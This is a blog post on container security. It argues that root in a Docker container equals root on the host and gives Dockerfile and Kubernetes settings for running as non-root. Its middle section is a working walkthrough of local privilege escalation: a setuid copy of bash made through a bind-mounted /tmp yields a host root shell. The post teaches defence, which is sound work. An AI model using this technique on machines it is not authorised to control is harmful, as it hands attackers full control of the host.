---
title: "The False Sense of Security: Running Containers as root"
author: wonderchild
date: 2023-03-26 14:30:00 +0500
categories: [Containers]
tags: [Containers, Security]
---


---

Containers have revolutionized modern software development, enabling us to develop, build, package, and deploy software applications faster and more efficiently than ever before. The benefits of containerization are many, from easier deployment and scaling to improved resource utilization and portability. However, despite the advantages that containers offer, they are not immune to security risks. In this post, let's discuss how root inside the container and on the host essentially mean one and the same thing.

## Insecure By Default

In her book [Container Security](https://www.oreilly.com/library/view/container-security/9781492056690/), Liz Rice described containers running as root as "the most insecure-by-default behavior in the container world", and despite this behavior being insecure, at the time of this writing, most if not all containers still run as root by default.

For instance, if we spin up an Ubuntu container using Docker and check the user ID, we can see that it's running as root:

```
$ docker run -it ubuntu /bin/bash
root@3de6e3805519:/# id
uid=0(root) gid=0(root) groups=0(root)
```

One might mistakenly assume like I myself had once believed, that root inside a container is completely isolated from the root on the host. However, that is not the case. 

To confirm that root in the Ubuntu container is the same as the root on the host, let's run the `sleep` command inside the container:

```
root@3de6e3805519:/# sleep infinity
```

Now, let's open another terminal on the same host, and use the `ps` command to see that this process is running under root's user ID:

```
$ ps -fC sleep
UID          PID    PPID  C STIME TTY          TIME CMD
root        4434    4152  0 19:38 pts/0    00:00:00 sleep infinity
```

From the perspective of the host, the `sleep` process is owned by the root user, as seen above. This indicates that root inside the container is essentially the same as root on the host.

This leads us to the question: how can attackers take advantage of this? So let's now explore how this practice could be abused by an attacker.

## Leveraging Containers for Privilege Escalation

Assuming we already have initial access to the machine as a normal non-root user on the host, let's demonstrate how an attacker can use containers to escalate their privileges.

To begin, we'll run an Ubuntu container and bind-mount the host's `/tmp` volume inside the container using the following command:

```
$ docker run -v /tmp:/tmp -it ubuntu /bin/bash
root@2ea086531742:/#
```

With the container up and running, let's open another terminal on the host as non-root user and copy the user's `/bin/bash` file to the `/tmp` directory using the following command:

```
$ cp /bin/bash /tmp
```

Next, in the Ubuntu container, let's see who owns the `/tmp/bash` file:

```
root@2ea086531742:/# ls -l /tmp/bash 
-rwxr-xr-x 1 1000 1001 1234376 Mar 25 17:21 /tmp/bash
```

As we can see, the file is currently owned by the non-root user with UID `1000`.

Now, we'll use the `chown` command to change the ownership of the file to the root user:

```
root@2ea086531742:/# chown root:root /tmp/bash
root@2ea086531742:/# ls -l /tmp/bash
-rwxr-xr-x 1 root root 1234376 Mar 25 17:21 /tmp/bash
```

The file is now owned by root, so we'll set the `setuid` bit on the file using the `chmod` command:

```
root@2ea086531742:/# chmod +s /tmp/bash
root@2ea086531742:/# ls -l /tmp/bash
-rwsr-sr-x 1 root root 1234376 Mar 25 17:21 /tmp/bash
```

Now that the `setuid` bit is set, we can go back to the terminal of the non-root user and execute the `/tmp/bash` file with the `-p` option to launch bash in privileged mode and maintain the privileges owned by the file's owner:

```
$ /tmp/bash -p
bash-5.1# whoami
root
```

So now, even though we ran the `/tmp/bash` file as a regular non-root user, we have become root on the host.

If you want to see this in action, I suggest giving HackTheBox's now-retired [GoodGames](https://app.hackthebox.com/machines/GoodGames) machine a try. A good friend of mine, Abdullah Rizwan has a nice [writeup](https://arz101.medium.com/hackthebox-goodgames-20358b06420c) on the machine.

Furthermore, there are numerous other techniques that attackers can use to escape their privileges, such as [this](https://www.electricmonk.nl/log/2017/09/30/root-your-docker-host-in-10-seconds-for-fun-and-profit/) in the blog post from Ferry Boender, or the [one](https://medium.com/@mccode/processes-in-containers-should-not-run-as-root-2feae3f0df3b) by Marc Campbell.

## Remediation

If you're using Docker as your container runtime, the fix is as simple as adding the following two lines to your Dockerfile:

```
RUN groupadd --gid 65532 nonroot \
    && useradd --uid 65532 --gid 65532 -m nonroot
USER nonroot
```

Alternatively, if you're working with Kubernetes, you can leverage the `securityContext` setting or `PodSecurityPolicy`. However, since the latter is deprecated, here's an example of how you can use the former to prevent privilege escalation:

```yaml
securityContext:
  allowPrivilegeEscalation: false
  capabilities:
    drop:
      - ALL
  runAsNonRoot: true
```

## Conclusion

To sum up, we've learned how the ephemeral nature of containers can give us a false sense of security, and that root inside a container is equivalent to root on the host. This means that a successful container escape can lead to a complete compromise of the host. To prevent this, it's crucial to follow the principle of least privilege and adopt security best practices. Without these measures, we'd just be a single misconfiguration away from allowing an attacker to gain full control.